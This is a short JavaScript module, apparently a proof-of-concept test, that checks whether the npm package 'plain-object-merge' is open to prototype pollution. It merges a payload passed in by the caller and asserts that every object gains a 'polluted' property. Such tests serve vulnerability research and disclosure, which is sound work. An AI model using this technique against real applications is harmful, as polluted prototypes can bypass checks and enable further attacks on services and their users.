function exploitFunction(payload) {
    const merge = require("plain-object-merge");
    const obj = {};
    expect({}.polluted).toBe(undefined);
    merge([{}, payload]);
    expect({}.polluted).toBe("yes");
}

module.exports = { exploitFunction };